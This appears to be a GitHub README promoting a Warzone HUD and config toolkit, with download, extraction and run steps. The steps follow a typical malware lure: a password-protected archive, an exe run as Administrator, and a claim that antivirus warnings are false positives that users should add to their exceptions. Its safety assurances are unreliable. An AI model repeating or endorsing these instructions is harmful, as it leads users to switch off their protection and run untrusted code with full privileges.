## 🎯 About

**Warzone Tactical Suite** is a lightweight config and overlay toolkit for Call of Duty: Warzone. It gives you full control over your HUD layout, performance profiles, keybind presets, and visual clarity settings — all in one clean interface.

Built for competitive players who want a clean HUD, stable FPS, and zero distractions.

> **No game file modification. No anti-cheat interaction. System-level config only.**

---

## ✨ Features

| Feature | Description |
|---|---|
| 🎯 **HUD Profiles** | 12 pre-built HUD layouts for different playstyles |
| ⚡ **Performance Presets** | FPS optimization profiles (Low / Balanced / Max FPS) |
| 🎨 **Visual Clarity** | Contrast, brightness, and color profiles for spotting enemies |
| ⌨️ **Keybind Manager** | Import / export keybind presets for Warzone |
| 🔊 **Audio Profiles** | Footstep clarity EQ presets (requires external EQ) |
| 📊 **Session Stats** | Track session performance in a lightweight overlay |
| 💾 **Config Backup** | One-click backup and restore of Warzone configs |
| 🔄 **Auto-Update** | Config profiles update with each Warzone season |

## 📥 Download & Installation

### Step 1: Download
Get the latest version from **[Releases](https://github.com/SouthPatronSnips/warzone-tactical-suite/releases)**.

### Step 2: Extract
Extract the archive using **WinRAR** or **7-Zip**.

> **🔑 Password:** `6427910552`

### Step 3: Run
1. Run `WZTacticalSuite.exe` as **Administrator**.
2. Select your preset (HUD, Performance, Visual).
3. Click **"Apply"**.
4. Launch Warzone — settings are applied automatically.

> ⚠️ **Note:** Your antivirus may flag this tool — this is a **false positive**. The suite modifies system-level config files. Add it to your exceptions list.

<details>
<summary><b>❓ Is this a cheat?</b></summary>

<details>
<summary><b>❓ Will I get banned?</b></summary>
<br>
